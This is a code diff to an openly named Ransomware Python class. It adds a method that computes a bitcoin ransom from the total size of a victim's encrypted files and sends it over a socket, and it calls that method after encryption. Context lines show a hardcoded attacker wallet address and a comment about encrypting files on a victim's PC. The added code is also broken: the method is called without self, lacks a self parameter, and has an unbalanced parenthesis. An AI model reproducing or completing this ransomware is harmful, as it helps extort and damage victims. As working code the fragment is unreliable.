@@ -17,7 +17,7 @@ class Ransomware:
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
-    bitcoin_needed = 0.001 * number_of_files + 0.000000000001 * mac_address #TODO: Assign this based on number of files
+#     bitcoin_needed = 0.001 * number_of_files + 0.000000000001 * mac_address #TODO: Assign this based on number of files
     wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
 
 
@@ -166,7 +166,12 @@ class Ransomware:
             the_file.write(encrypted_contents)
         print("terminated")
 
-
+    def calculate_and_send_bitcoin_needed(size_of_files):
+        #subin equation: 
+        bitcoin_needed = size_of_files/ 10000000
+        self._socket.sendall(base64.b64encode(int.to_bytes(bitcoin_needed))
+        
+        
 
 
     # Encrypt all the safe to encrypt files on a victims pc
@@ -195,6 +200,8 @@ class Ransomware:
 
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
+        
+        calculate_and_send_bitcoin_needed(size_of_files)
 
 
 
